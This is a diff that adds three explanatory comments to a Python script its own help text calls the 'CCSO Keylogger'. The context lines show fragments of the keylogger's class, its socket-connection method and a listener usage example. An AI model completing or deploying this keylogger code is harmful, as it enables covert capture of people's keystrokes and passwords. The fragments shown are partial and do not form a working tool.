@@ -20,6 +20,7 @@ from datetime import datetime
 
 # Classes for good python developer standards :)!
 class Keylogger:
+    # Constructor
     def __init__(self):
         self.args = args
         self.log = ""
@@ -71,6 +72,7 @@ class Keylogger:
 
         self.log += name
 
+    # Initial connection
     def init_conn(self):
         conn = False
         # Check if there is already a socket connection, if there is, do nothing
@@ -224,6 +226,7 @@ class Keylogger:
             except KeyboardInterrupt:
                 sys.exit(0)
 
+# Arg parse
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
         Creating a listener: sudo python logger.py -l
